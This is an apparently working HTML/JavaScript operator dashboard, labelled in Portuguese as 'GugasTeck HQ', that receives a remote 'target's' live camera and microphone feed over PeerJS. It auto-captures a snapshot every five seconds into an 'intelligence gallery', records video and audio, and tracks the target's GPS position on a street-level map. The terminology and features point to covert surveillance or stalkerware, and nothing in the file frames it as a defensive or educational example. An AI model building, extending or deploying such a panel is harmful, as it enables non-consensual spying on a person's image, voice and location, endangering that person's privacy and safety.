<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <title>GugasTeck - HQ v14.4</title>
    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <style>
        :root { --neon: #00f2ff; --bg: #050505; --panel: #0a0a0a; --border: #1a1d23; --danger: #ff003c; }
        body, html { height: 100%; margin: 0; background: var(--bg); color: var(--neon); font-family: 'Consolas', monospace; overflow-x: hidden; }
        
        /* Layout Desktop Base */
        .dashboard { display: grid; grid-template-columns: 300px 1fr 300px; grid-template-rows: 60px 1fr 200px; height: 100vh; gap: 8px; padding: 8px; box-sizing: border-box; }

        header { grid-column: 1 / 4; background: var(--panel); border: 1px solid var(--border); display: flex; align-items: center; justify-content: space-between; padding: 0 20px; border-radius: 8px; }
        .logo { font-size: 22px; font-weight: 900; letter-spacing: 8px; color: #fff; text-shadow: 0 0 15px var(--neon); }
        .logo span { color: var(--neon); }

        .col-left { grid-column: 1; grid-row: 2 / 4; background: var(--panel); border: 1px solid var(--border); padding: 15px; display: flex; flex-direction: column; gap: 10px; overflow-y: auto; }
        .col-center { grid-column: 2; grid-row: 2; background: #000; border: 1px solid var(--border); display: flex; align-items: center; justify-content: center; position: relative; }
        video { width: 100%; height: 100%; object-fit: contain; }
        
        .col-map { grid-column: 2; grid-row: 3; border: 1px solid var(--border); min-height: 200px; }
        #map { width: 100%; height: 100%; filter: invert(0.9) hue-rotate(180deg); }

        .col-right { grid-column: 3; grid-row: 2 / 4; background: var(--panel); border: 1px solid var(--border); padding: 15px; overflow-y: auto; }
        .photo-card { border: 1px solid var(--border); margin-bottom: 10px; padding: 5px; background: #000; }
        .photo-card img { width: 100%; }

        /* Responsividade Mobile */
        @media (max-width: 768px) {
            .dashboard { display: flex; flex-direction: column; height: auto; overflow-y: auto; }
            header { height: 60px; margin-bottom: 5px; }
            .col-left, .col-right { order: 3; width: 100%; height: auto; }
            .col-center { order: 1; height: 50vh; width: 100%; } /* LiveCam Grande */
            .col-map { order: 2; height: 40vh; width: 100%; }   /* Mapa Grande */
            .logo { font-size: 16px; letter-spacing: 3px; }
        }

        .btn { background: none; border: 1px solid var(--neon); color: var(--neon); padding: 12px; cursor: pointer; width: 100%; font-family: 'Consolas'; font-size: 12px; }
        #analysis-board { background: #000; padding: 10px; font-size: 11px; color: #ffb400; min-height: 100px; border: 1px solid #111; overflow-y: auto; }
        audio { width: 100%; filter: invert(1); margin-top: 10px; }
    </style>
</head>
<body>

<div class="dashboard">
    <header>
        <div class="logo">GUGAS<span>TECK</span></div>
        <div id="clock" style="font-size: 12px;">00:00:00</div>
    </header>

    <aside class="col-left">
        <button class="btn" id="initBtn" onclick="boot()">ATIVAR TERMINAL</button>
        <button class="btn" id="recVidBtn" onclick="toggleVidRec()" disabled>GRAVAR VÍDEO</button>
        <button class="btn" id="recAudBtn" onclick="toggleAudRec()" disabled>GRAVAR ÁUDIO</button>
        <div id="analysis-board">> Aguardando sinal...</div>
        <audio id="aud" controls autoplay></audio>
    </aside>

    <main class="col-center">
        <video id="vid" autoplay playsinline muted></video>
        <div style="position:absolute; top:10px; right:10px; background:red; color:white; padding:2px 8px; font-size:10px; font-weight:bold; border-radius:3px;">LIVE</div>
    </main>

    <section class="col-map">
        <div id="map"></div>
    </section>

    <aside class="col-right" id="gallery">
        <div style="font-size:10px; color:#555; margin-bottom:10px; border-bottom:1px solid #222;">GALERIA DE INTELIGÊNCIA</div>
    </aside>
</div>

<script>
    const ROOM_ID = "GUGAS_STABLE_V14_FINAL";
    let peer, map, marker, streamRef, vidRec, audRec, vChunks = [], aChunks = [];

    setInterval(() => { document.getElementById('clock').innerText = new Date().toLocaleTimeString(); }, 1000);
    map = L.map('map', {zoomControl: true}).setView([0,0], 2);
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);

    function report(m) {
        const b = document.getElementById('analysis-board');
        b.innerHTML += `<div>> ${m}</div>`; b.scrollTop = b.scrollHeight;
    }

    function boot() {
        peer = new Peer(ROOM_ID);
        document.getElementById('initBtn').disabled = true;
        peer.on('open', () => report("Terminal pronto."));

        peer.on('call', (call) => {
            report("Alvo conectado.");
            call.answer();
            call.on('stream', (s) => {
                streamRef = s;
                document.getElementById('vid').srcObject = s;
                document.getElementById('aud').srcObject = s;
                document.getElementById('recVidBtn').disabled = false;
                document.getElementById('recAudBtn').disabled = false;
                document.getElementById('vid').play().then(() => { document.getElementById('vid').muted = false; });
                
                // CAPTURA AUTOMÁTICA ACELERADA (A cada 5 segundos)
                setInterval(autoSnap, 5000);
            });
        });

        peer.on('connection', (c) => {
            c.on('data', (d) => {
                const p = [d.lat, d.lon];
                if(!marker) marker = L.marker(p).addTo(map); else marker.setLatLng(p);
                map.flyTo(p, 18);
            });
        });
    }

    function autoSnap() {
        const v = document.getElementById('vid');
        if(v.videoWidth === 0) return;
        const c = document.createElement('canvas');
        c.width = v.videoWidth; c.height = v.videoHeight;
        c.getContext('2d').drawImage(v, 0, 0);
        const data = c.toDataURL('image/png');
        const card = document.createElement('div');
        card.className = 'photo-card';
        card.innerHTML = `<img src="${data}"><a href="${data}" download="snap.png" style="display:block; background:var(--neon); color:#000; text-align:center; font-size:10px; font-weight:bold; text-decoration:none; padding:5px; margin-top:5px;">BAIXAR</a>`;
        document.getElementById('gallery').prepend(card);
    }

    // Lógica de gravação mantida conforme anterior para não danificar funcionalidade
    function toggleVidRec() {
        if (!vidRec || vidRec.state === "inactive") {
            vChunks = []; vidRec = new MediaRecorder(streamRef);
            vidRec.ondataavailable = e => vChunks.push(e.data);
            vidRec.onstop = () => {
                const b = new Blob(vChunks, {type:'video/webm'});
                const u = URL.createObjectURL(b);
                const a = document.createElement('a'); a.href = u; a.download = 'Gugas_Video.webm'; a.click();
            };
            vidRec.start(); document.getElementById('recVidBtn').style.background = "red";
        } else { vidRec.stop(); document.getElementById('recVidBtn').style.background = "none"; }
    }

    function toggleAudRec() {
        if (!audRec || audRec.state === "inactive") {
            aChunks = []; 
            const audioStream = new MediaStream(streamRef.getAudioTracks());
            audRec = new MediaRecorder(audioStream);
            audRec.ondataavailable = e => aChunks.push(e.data);
            audRec.onstop = () => {
                const b = new Blob(aChunks, {type:'audio/ogg'});
                const u = URL.createObjectURL(b);
                const a = document.createElement('a'); a.href = u; a.download = 'Gugas_Audio.ogg'; a.click();
            };
            audRec.start(); document.getElementById('recAudBtn').style.background = "red";
        } else { audRec.stop(); document.getElementById('recAudBtn').style.background = "none"; }
    }
</script>
</body>
</html>
